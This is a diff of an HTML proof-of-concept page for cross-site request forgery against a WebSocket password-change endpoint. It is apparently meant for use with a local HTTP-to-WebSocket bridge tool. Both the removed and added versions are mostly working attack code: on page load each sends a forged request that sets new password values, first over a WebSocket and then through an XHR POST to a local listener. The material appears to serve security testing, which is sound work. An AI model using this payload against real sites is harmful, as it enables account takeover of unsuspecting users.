@@ -1,68 +1,42 @@
-<code>
-  <title>CSRF Web socket POC</title>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CSRF Web socket POC for HTTP2WebSocket</title>
+</head>
+
+<body>
+
  <script language="javascript" type="text/javascript">
 
-  //URL points to the local listener + WS endpoint
-  var wsUri = "http://127.0.0.1:3333/change-password"; 
-  var output;
-
-  function init()
-  {
-    output = document.getElementById("output");
-    testWebSocket();
-  }
-
-  function testWebSocket()
-  {
-    websocket = new WebSocket(wsUri);
-    websocket.onopen = function(evt) { onOpen(evt) };
-    websocket.onclose = function(evt) { onClose(evt) };
-    websocket.onmessage = function(evt) { onMessage(evt) };
-    websocket.onerror = function(evt) { onError(evt) };
-  }
-
-  function onOpen(evt)
-  {
-    writeToScreen("CONNECTED");
-    //Payload to change the password
-    doSend("{\"npass\":\"Pwd1234\",\"cpass\":\"Pwd1234\"}");   
-  }
-
-  function onClose(evt)
-  {
-    writeToScreen("DISCONNECTED");
-  }
-
-  function onMessage(evt)
-  {
-    writeToScreen('<span style="color: blue;">RESPONSE: ' + evt.data+'</span>');
-    websocket.close();
-  }
-
-  function onError(evt)
-  {
-    writeToScreen('<span style="color: red;">ERROR:</span> ' + evt.data);
-  }
-
-  function doSend(message)
-  {
-    writeToScreen("SENT: " + message);
-    websocket.send(message);
-  }
-
-  function writeToScreen(message)
-  {
-    var pre = document.createElement("p");
-    pre.style.wordWrap = "break-word";
-    pre.innerHTML = message;
-    output.appendChild(pre);
-  }
-
-  window.addEventListener("load", init, false);
+  	//URL points to the local listener WS endpoint
+  	var wsUri = "http://127.0.0.1:3333/change-password"; 
+  
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", wsUri, true);
+	xhr.setRequestHeader("Content-Type", "application/json");
+	xhr.onreadystatechange = function () {
+	    output = document.getElementById("output");
+	    if (xhr.readyState === 4 && xhr.status === 200) {
+		var json = JSON.parse(xhr.responseText);
+		
+		output.innerHTML = json;
+	    }
+	    else {
+	    	output.innerHTML = "Cannot read the response, probably the error is due to CORS browser exstension. Check the HTTP2WebSocket.py console message";
+	    }
+	};
+	var data = JSON.stringify({"npass": "PWD01", "cpass": "PWD01"});
+	xhr.send(data);
 
   </script>
 
-  <h2>CSRF Websocket POC</h2>
+
+  <h2>CSRF Websocket POC for HTTP2WebSocket</h2>
 
   <div id="output"></div>
-  </code>
+  
+  </body>
+  </html>
